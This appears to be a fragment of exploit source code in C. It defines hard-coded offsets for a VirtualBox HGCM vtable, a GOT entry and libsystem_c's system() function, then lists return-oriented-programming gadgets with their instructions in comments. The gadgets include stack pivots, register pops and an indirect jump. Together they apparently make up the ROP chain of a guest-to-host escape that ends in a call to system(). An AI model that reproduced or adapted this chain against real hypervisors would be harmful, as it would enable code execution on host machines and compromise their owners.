uint64_t hgcm_vtable_offset = 0x002e3d50;
uint64_t got_stack_chk_fail = 0x002D5200;
uint64_t libsystem_c_system = 0x0007C81A;
uint64_t libsystem_c_stack_chk_fail = 0x0005DA2B;

uint64_t pop_pop_pop_ret = 0x00003fdc; 		// pop r14 ; pop r15 ; pop rbp ; ret
uint64_t ret = 0x00003de9; 			// ret
uint64_t add_rax_rcx_jmp_rax = 0x000368f0; 	// add rax, rcx ; jmp rax
uint64_t pop_rcx = 0x0015e8b3; 			// pop rcx ; ret
uint64_t mov_rax_mem_rdi_pop = 0x001b36c9; 	// mov rax, qword [rdi] ; pop rbp ; ret
uint64_t pop_rsp = 0x0016d7e6; 			// pop rsi ; adc byte [rbx+0x41], bl ; pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret
uint64_t push_rax = 0x0000e9e5;			// push rax ; mov rbx, rdi ; mov rax, qword [rbx] ; call qword [rax]
uint64_t pop_rdi = 0x001d138f; 			// pop rdi ; ret
